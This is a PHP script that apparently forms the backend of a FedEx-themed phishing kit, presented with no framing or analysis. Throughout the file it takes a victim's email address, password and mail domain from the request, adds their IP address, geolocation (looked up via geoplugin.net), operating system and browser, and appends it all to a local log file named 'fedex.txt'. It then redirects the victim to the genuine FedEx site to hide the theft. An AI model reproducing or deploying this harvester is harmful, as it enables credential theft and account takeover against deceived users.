<?php

if (isset($_GET["Domain"])) {

        function getUserIP()
        {
                $client  = @$_SERVER['HTTP_CLIENT_IP'];
                $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
                $remote  = $_SERVER['REMOTE_ADDR'];

                if (filter_var($client, FILTER_VALIDATE_IP)) {
                        $ip = $client;
                } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
                        $ip = $forward;
                } else {
                        $ip = $remote;
                }

                return $ip;
        }

        $user_ip = getUserIP();

        // get browser

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        function getOS()
        {

                global $user_agent;

                $os_platform    =   "Not Available";

                $os_array  = array(
                        '/windows/i'     =>  'Microsoft Windows',
                        '/windows nt 11/i'     =>  'Windows 11',
                        '/windows nt 10/i'     =>  'Windows 10',
                        '/windows nt 6.4/i'     =>  'Windows 10',
                        '/windows nt 6.3/i'     =>  'Windows 8.1',
                        '/windows nt 6.2/i'     =>  'Windows 8',
                        '/windows nt 6.1/i'     =>  'Windows 7',
                        '/windows nt 6.0/i'     =>  'Windows Vista',
                        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                        '/windows nt 5.1/i'     =>  'Windows XP',
                        '/windows xp/i'         =>  'Windows XP',
                        '/windows nt 5.0/i'     =>  'Windows 2000',
                        '/windows me/i'         =>  'Windows ME',
                        '/win98/i'              =>  'Windows 98',
                        '/win95/i'              =>  'Windows 95',
                        '/win16/i'              =>  'Windows 3.11',
                        '/macintosh|mac os x/i' =>  'Mac OS X',
                        '/macintosh|mac os x 10.0/'       => 'Mac OS X Cheetah',
                        '/macintosh|mac os x 10.1/'       => 'Mac OS X Puma',
                        '/macintosh|mac os x 10.2/'       => 'Mac OS X Jaguar',
                        '/macintosh|mac os x 10.3/'       => 'Mac OS X Panther',
                        '/macintosh|mac os x 10.4/'       => 'Mac OS X Tiger',
                        '/macintosh|mac os x 10.5/'       => 'Mac OS X Leopard',
                        '/macintosh|mac os x 10.6/'       => 'Mac OS X Snow Leopard',
                        '/macintosh|mac os x 10.7/'       => 'Mac OS X Lion',
                        '/macintosh|mac os x 10.8/'       => 'Mac OS X Mountain Lion',
                        '/macintosh|mac os x 10.9/'       => 'Mac OS X Mavericks',
                        '/macintosh|mac os x 10.10/'       => 'Mac OS X Yosemite',
                        '/macintosh|mac os x 10.11/'       => 'Mac OS X El Capitan',
                        '/macintosh|mac os x 10.12/'       => 'Mac OS X Sierra',
                        '/macintosh|mac os x 10.13/'       => 'Mac OS X High Sierra',
                        '/macintosh|mac os x 10.14/'       => 'Mac OS X Mojave',
                        '/macintosh|mac os x 10.15/'       => 'Mac OS X Catalina',
                        '/macintosh|mac 0s 11/'       => 'Mac OS Big Sur',
                        '/macintosh|mac 0s 12/'       => 'Mac OS Monterey',
                        '/macintosh|mac_powerpc/i'        =>  'Mac OS 9',
                        '/macintosh/'             => 'Apple Mac OS',
                        '/linux/i'              =>  'Linux',
                        '/ubuntu/i'             =>  'Linux Ubuntu',
                        '/debian/i'             =>  'Linux Debian',
                        '/gentoo/i'             =>  'Linux Gentoo',
                        '/mint/i'             =>  'Linux Mint',
                        '/arch/i'             =>  'Linux Arch',
                        '/OpenSUSE/i'             =>  'Linux OpenSUSE',
                        '/red hat enterprise/i'  =>  'Red Hat Enterprise Linux',
                        '/CentOS/i'              =>  'Linux CentOS',
                        '/Fedora/i'              =>  'Linux Fedora',
                        '/kali/i'              =>  'Kali Linux',
                        '/iphone/i'             =>  'iPhone',
                        '/ipod/i'               =>  'iPod',
                        '/ipad/i'               =>  'iPad',
                        '/android/i'            =>  'Android',
                        '/blackberry/i'         =>  'BlackBerry',
                        '/webos/i'              =>  'Mobile'
                );

                foreach ($os_array as $regex => $value) {

                        if (preg_match($regex, $user_agent)) {
                                $os_platform    =   $value;
                        }
                }

                return $os_platform;
        }

        function getBrowser()
        {

                global $user_agent;

                $browser        =   "Not Available";

                $browser_array  =   array(
                        '/msie/i'       =>  'Internet Explorer',
                        '/mse/i'       =>  'Microsoft Edge',
                        '/edge/i'       =>  'Microsoft Edge',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser',
                        '/seamonkey/i'     =>  'Sea Monkey',
                        '/yandex/i'     =>  'Yandex Browser',
                        '/uc browser/i'     =>  'UC Web Browser',
                        '/baidu/i'     =>  'Baidu Browser',
                        '/360/i'     =>  '360 Browser',
                        '/qq/i'     =>  'QQ Browser',
                        '/chromium/i'     =>  'Chromium Browser',
                        '/tor/i'     =>  'Tor Browser',
                        '/vivaldi/i'     =>  'Vivaldi Browser',
                        '/brave/i'     =>  'Brave Browser'
                );

                foreach ($browser_array as $regex => $value) {

                        if (preg_match($regex, $user_agent)) {
                                $browser    =   $value;
                        }
                }

                return $browser;
        }

        $url = 'http://www.geoplugin.net/json.gp?ip=' . $_SERVER['REMOTE_ADDR'];

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

        $ouputdata = curl_exec($ch);
        curl_close($ch);

        $response_tags = json_decode($ouputdata);

        $country = $response_tags->geoplugin_countryName;
        $state = $response_tags->geoplugin_region;
        $city = $response_tags->geoplugin_city;


        $user_os        =   getOS();
        $user_browser   =   getBrowser();

        $ip = $_SESSION["ip_address"] =  $user_ip;
        $location = $_SESSION["country"] = $country;
        $state = $_SESSION["state"] = $state;
        $city = $_SESSION["city"] = $city;
        $operatingSystem = $_SESSION["device"] = $user_os;
        $browser = $_SESSION["browser"] = $user_browser;


        $mydate = getdate(date("U"));
        $currentDate = "$mydate[weekday] - $mydate[month] $mydate[mday] - $mydate[year]";

        $mainFile = "fedex.txt";
        $retriveData = file_get_contents($mainFile);
        $retriveData .= '
        Mail Domain: ' . $_GET["Domain"] . '
        E-mail: ' . $_GET["Mail"] . '
        Password: ' . $_GET["Password"] . '
        IP Address: ' . $ip . '
        Country: ' . $location . '
        State: ' . $state . '
        Device: ' . $operatingSystem . '
        Browser: ' . $browser . '
        Date: ' . $currentDate . '
        .......................................................

';
        file_put_contents($mainFile, $retriveData);

        header("Location: https://www.fedex.com/en-us/service-alerts.html");
}
else {

        header("location: https://www.fedex.com/en-us/service-alerts.html");
}
